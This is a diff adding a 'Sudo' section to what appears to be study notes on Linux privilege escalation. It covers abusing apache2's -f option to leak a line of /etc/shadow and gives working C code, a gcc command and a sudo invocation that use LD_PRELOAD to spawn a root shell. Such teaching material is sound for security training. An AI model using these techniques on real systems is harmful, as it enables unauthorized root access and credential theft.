@@ -55,3 +55,48 @@ Search for the exploit can be done using Google for an existing exploit code, a 
 Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).
 
 ## Sudo
+
+The sudo command, by default, allows you to run a program with root privileges.
+Any user can check its current situation related to root privileges using the "sudo -l" command. [GTFObins](https://gtfobins.github.io/) is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.
+
+### Leverage application functions
+
+    Some applications will not have a known exploit within this context.
+    Example, for apache2 server, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile).
+    Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file.
+
+### Leverage LD_PRELOAD
+
+On some systems, you may see the LD_PRELOAD environment option.
+LD_PRELOAD is a function that allows any program to use shared libraries. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.
+
+The steps of this privilege escalation vector can be summarized as follows;
+
+    Check for LD_PRELOAD (with the env_keep option)
+    Write a simple C code compiled as a share object (.so extension) file
+    Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
+
+The C code will simply spawn a root shell and can be written as follows;
+
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <stdlib.h>
+
+    void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+    }
+
+The code can be saved & compiled using gcc into a shared object file using the following parameters(shell.c is the file name of the above .c file):
+
+    gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+We can now use this shared object file when launching any program our user can run with sudo. In the example case, Apache2, find, or almost any of the programs we can run with sudo can be used. (i.e. found via the sudo -l command)
+
+We need to run the program by specifying the LD_PRELOAD option, as follows;
+
+    sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
+
+## SUID
